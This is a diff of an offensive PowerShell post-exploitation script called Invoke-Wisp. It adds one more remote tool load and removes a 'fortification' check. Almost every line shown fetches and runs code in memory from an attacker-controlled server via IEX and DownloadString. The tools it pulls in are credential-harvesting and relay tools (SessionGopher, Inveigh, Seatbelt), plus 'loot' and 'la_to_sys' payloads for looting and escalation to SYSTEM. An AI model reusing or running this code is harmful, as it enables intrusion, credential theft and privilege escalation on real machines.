@@ -2,7 +2,6 @@
     CREATED BY KARMAZ
 #>
 $global:url_1029384756=$null
-$global:fort_1029384756=$null
 
 function Invoke-Wisp {
     [Parameter(Mandatory, HelpMessage = "Please provide a server url address using -url 'http://<your_server>/'")]
@@ -43,6 +42,7 @@ function Memory_Load {
     IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/SessionGopher.ps1")
     IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/Inveigh.ps1")
     IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/Inveigh-Relay.ps1")
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/Invoke-Seatbelt.ps1")
 }
 
 function Escalation {
@@ -76,9 +76,6 @@ function looting {
         Write-Host -NoNewline -ForegroundColor Yellow "first, to set the URL for the functions."
         return
     }
-    if($global:fort_1029384756 -eq $null){
-        fortification
-    }
     IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/loot.txt")
 }
 
@@ -89,9 +86,6 @@ function get_system {
         Write-Host -NoNewline -ForegroundColor DarkYellow "Invoke-Wisp -Url '<your_server>' "
         Write-Host -NoNewline -ForegroundColor Yellow "first, to set the URL for the functions."
         return
-    }
-    if($global:fort_1029384756 -eq $null){
-        fortification
     }
     IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/la_to_sys.txt")
 }
